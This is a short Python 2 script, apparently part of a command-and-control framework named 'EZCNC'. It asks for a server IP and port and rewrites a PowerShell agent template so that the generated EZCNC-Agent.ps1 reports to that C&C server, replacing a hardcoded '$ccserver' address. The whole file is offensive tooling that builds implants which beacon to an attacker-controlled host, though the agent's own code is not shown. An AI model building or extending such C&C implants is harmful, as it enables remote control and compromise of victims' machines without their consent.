import os

skeleton = 'template.ps1.new'
fileName = 'EZCNC-Agent.ps1'

print "[+] What is the IP Address of the Server"
ip = str(raw_input('')) 
print "[+] What is the Port you want to listen on"
port = str(raw_input())
print('[!] Server is ' + ip + ':' + port)

server = (ip+':'+port)

print('[!] Agent Created and saved to ./AgentRequirements/' + fileName)

# Old line and New Line
old = '$ccserver = "192.168.9.4:8000"'
new = '$ccserver = "' + server + '"'

# Delete old file
os.remove('./AgentRequirements/' + fileName)
# open the skeleton .ps1 file and replace with user input of C&C Server
with open('./AgentRequirements/' + skeleton, 'r') as f:
    for line in f:
        line = line.replace(old, new)
        # Write to new .ps1 file
        i = open ('./AgentRequirements/' + fileName, 'a')
        i.write(line)
        i.close

